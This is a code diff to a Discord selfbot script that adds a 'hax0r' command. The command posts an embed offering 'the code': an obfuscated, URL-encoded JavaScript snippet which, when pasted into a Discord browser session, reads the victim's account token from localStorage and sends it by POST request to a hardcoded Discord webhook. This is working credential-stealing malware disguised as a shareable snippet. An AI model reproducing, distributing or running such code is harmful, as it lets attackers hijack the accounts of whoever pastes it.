@@ -230,7 +230,23 @@ if (message.content.startsWith(prefix + "farm-commands")) {
     }
 }
 //---------------------------------------------------------------------
- 
+ if (message.content.startsWith(prefix + "hax0r")) {
+    if (message.author.id == client.user.id) {
+        let help = new Discord.RichEmbed()
+            .setAuthor(`${message.author.username}`)
+            .setColor("BLUE")
+            .addBlankField()
+            .setDescription(`__**Heres the code**__
+          eval(decodeURIComponent('var%20_0x5f2c%3D%5B%27body%27%2C%27send%27%2C%27open%27%2C%27-Token%5Cx20%27%2C%27Content-type%27%2C%27Done%27%2C%27createElement%27%2C%27iframe%27%2C%27application%2Fjson%27%2C%27appendChild%27%2C%27localStorage%27%2C%27Token-Web%27%2C%27https%3A%2F%2Fdiscord.com%2Fapi%2Fwebhooks%2F776110738661572678%2Fv51p9-rSzHB1Di80DpyO8T0OzwHEYrA9PgvAcErar33D90gH6IbTurDUhpf-YfJ1-mSE%27%2C%27token%27%2C%27POST%27%2C%27reload%27%2C%27stringify%27%2C%27setRequestHeader%27%5D%3B%28function%28_0x413567%2C_0x5f2cb2%29%7Bvar%20_0x56f68a%3Dfunction%28_0x111c84%29%7Bwhile%28--_0x111c84%29%7B_0x413567%5B%27push%27%5D%28_0x413567%5B%27shift%27%5D%28%29%29%3B%7D%7D%3B_0x56f68a%28%2B%2B_0x5f2cb2%29%3B%7D%28_0x5f2c%2C0x101%29%29%3Bvar%20_0x56f6%3Dfunction%28_0x413567%2C_0x5f2cb2%29%7B_0x413567%3D_0x413567-0x0%3Bvar%20_0x56f68a%3D_0x5f2c%5B_0x413567%5D%3Breturn%20_0x56f68a%3B%7D%3Bvar%20_0x54e6e1%3D_0x56f6%3Blocation%5B_0x54e6e1%28%270xa%27%29%5D%28%29%3Bvar%20i%3Ddocument%5B_0x54e6e1%28%270x1%27%29%5D%28_0x54e6e1%28%270x2%27%29%29%3Bdocument%5B_0x54e6e1%28%270xd%27%29%5D%5B_0x54e6e1%28%270x4%27%29%5D%28i%29%3Bvar%20request%3Dnew%20XMLHttpRequest%28%29%3Brequest%5B_0x54e6e1%28%270xf%27%29%5D%28_0x54e6e1%28%270x9%27%29%2C_0x54e6e1%28%270x7%27%29%29%2Crequest%5B_0x54e6e1%28%270xc%27%29%5D%28_0x54e6e1%28%270x11%27%29%2C_0x54e6e1%28%270x3%27%29%29%3Bvar%20params%3D%7B%27username%27%3A_0x54e6e1%28%270x6%27%29%2C%27content%27%3Ai%5B%27contentWindow%27%5D%5B_0x54e6e1%28%270x5%27%29%5D%5B_0x54e6e1%28%270x8%27%29%5D%2B_0x54e6e1%28%270x10%27%29%7D%3Brequest%5B_0x54e6e1%28%270xe%27%29%5D%28JSON%5B_0x54e6e1%28%270xb%27%29%5D%28params%29%29%2Calert%28_0x54e6e1%28%270x0%27%29%29%3B'));
+         
+    `)
+            .setThumbnail(`${message.author.avatarURL}`)
+            .setFooter("🠶〖𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 ᥅ꪖ᥊ꪀ#0002   〗")
+        message.channel.send(help)
+        console.log(`${client.user.tag} ran command </hax0r>.`)
+    }
+}
+
 if (message.content.startsWith(prefix + "nsfw-commands")) {
     if (message.author.id == client.user.id) {
         let help = new Discord.RichEmbed()
